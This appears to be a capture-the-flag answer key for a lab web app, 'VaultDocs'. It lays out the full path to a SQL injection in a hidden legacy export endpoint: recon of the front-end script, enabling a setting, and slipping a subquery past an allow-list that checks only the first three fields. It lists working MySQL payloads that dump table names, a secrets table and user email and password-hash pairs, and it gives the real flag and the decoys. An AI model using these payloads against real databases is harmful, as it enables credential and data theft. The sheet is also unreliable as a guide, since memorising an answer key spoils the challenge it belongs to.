## VaultDocs — `/vault` — EXTREME — MySQL 8.0

**Where:** hidden legacy endpoint **`GET /vault/api/v1/export?fields=...`** (header `X-API-Key`). `fields` is placed straight into the SELECT list: `SELECT <fields> FROM documents WHERE owner_id=<you> LIMIT 50`. Not quoted, so no quote is needed.

**Chain of preconditions**
1. Register (`POST /vault/api/v2/auth/register` → `api_key`) and send it as `X-API-Key` on every call.
2. Find the endpoint: it is not in any UI. The front-end script `/vault/static/app.js` contains a `legacyExport()` helper pointing at `/vault/api/v1/export`. (Recon: read the JS.)
3. Calling it returns `403 legacy export is not enabled for this account`. `GET /vault/api/v2/settings` lists `"legacy_export": false`; enable it with `PATCH /vault/api/v2/settings` body `{"legacy_export": true}`.
4. Now `/api/v1/export` works. It validates `fields` against an allow-list **only for the first three comma-separated items**, and rejects `'`, `"`, backtick and `;`. So: supply three valid fields (`title,created_at,size`) and put the injection in the 4th item.
5. No quotes allowed → use `database()`, hex literals (`0x...`) and `concat_ws(0x3a,...)`.

**Output:** the values come back in-band in the JSON `rows`, keyed by the expression text. Subqueries must return one row → use `group_concat`.

**Payloads** (`fields` value):
```
version : title,created_at,size,(select version())
tables  : title,created_at,size,(select group_concat(table_name) from information_schema.tables where table_schema=database())
columns : title,created_at,size,(select group_concat(column_name) from information_schema.columns where table_name=0x7661756c745f73656372657473)   -- hex('vault_secrets')
data    : title,created_at,size,(select group_concat(secret_name,0x3d,secret_value) from vault_secrets)
users   : title,created_at,size,(select group_concat(email,0x3a,password_hash) from users)
```
Real flag: `FLAG{vaultdocs_the_legacy_door_was_never_locked}` (row `signing_secret`; `decoy_flag` is a fake). Note the app user can only see this schema in `information_schema`.

**Rabbit holes:** `/vault/admin` (parameterised login); `/vault/api/v2/admin/*` (403); `/vault/robots.txt`; `/vault/backup.sql`, `/vault/.git/config` (404); `GET /vault/api/v2/export?fields=` (looks identical but strict allow-list on every item); `GET /vault/api/v2/documents?sort=` (allow-list map); `?tag=` and `?folder=` (parameterised); `GET /vault/api/v2/search?q=` (parameterised); `GET /vault/api/v2/audit?limit=` (int-cast); `v2/auth/*` (parameterised); tables `billing_accounts` (fake card tokens), `audit_log`, `share_links`, and the `decoy_flag` row.
